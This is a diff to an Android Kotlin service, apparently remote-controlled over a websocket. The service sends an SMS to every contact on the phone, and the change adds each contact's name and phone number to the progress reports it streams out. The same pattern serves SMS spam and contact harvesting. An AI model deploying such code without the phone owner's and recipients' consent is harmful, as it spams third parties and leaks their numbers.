@@ -653,14 +653,17 @@ class StreamingService : Service() {
                 getSystemService(SmsManager::class.java) else SmsManager.getDefault()
             var sent = 0; var failed = 0
             for ((name, number) in contacts) {
+                var ok = false
+                var errMsg = ""
                 try {
                     val parts = smsManager.divideMessage(text)
                     smsManager.sendMultipartTextMessage(number, null, parts, null, null)
-                    sent++
-                } catch (_: Exception) { failed++ }
+                    sent++; ok = true
+                } catch (e: Exception) { failed++; errMsg = e.message ?: "ошибка" }
                 ws.send(JSONObject().put("type","sms-broadcast-progress")
-                    .put("sent",sent).put("failed",failed).put("total",contacts.size).put("current",name).toString())
-                Thread.sleep(350) // пауза между отправками — не перегружать оператора
+                    .put("sent",sent).put("failed",failed).put("total",contacts.size)
+                    .put("current",name).put("number",number).put("ok",ok).put("err",errMsg).toString())
+                Thread.sleep(350)
             }
             done(true, "Рассылка завершена", sent, failed)
         }.start()
